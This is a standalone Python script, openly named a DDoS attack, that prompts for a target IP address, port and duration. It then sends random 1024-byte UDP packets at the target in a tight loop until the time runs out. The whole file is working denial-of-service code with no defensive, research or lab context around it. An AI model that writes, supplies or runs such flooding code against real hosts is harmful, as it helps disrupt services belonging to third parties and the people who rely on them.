def ddos_attack(target_ip, target_port, duration):
    import socket
    import time
    import random

    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random data to send
    data = random._urandom(1024)

    # Calculate the end time for the attack
    end_time = time.time() + duration

    print(f"Starting DDoS attack on {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < end_time:
        try:
            # Send the data to the target IP and port
            sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error sending data: {e}")

    print("DDoS attack completed.")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    duration = int(input("Enter the duration of the attack in seconds: "))
    ddos_attack(target_ip, target_port, duration)
    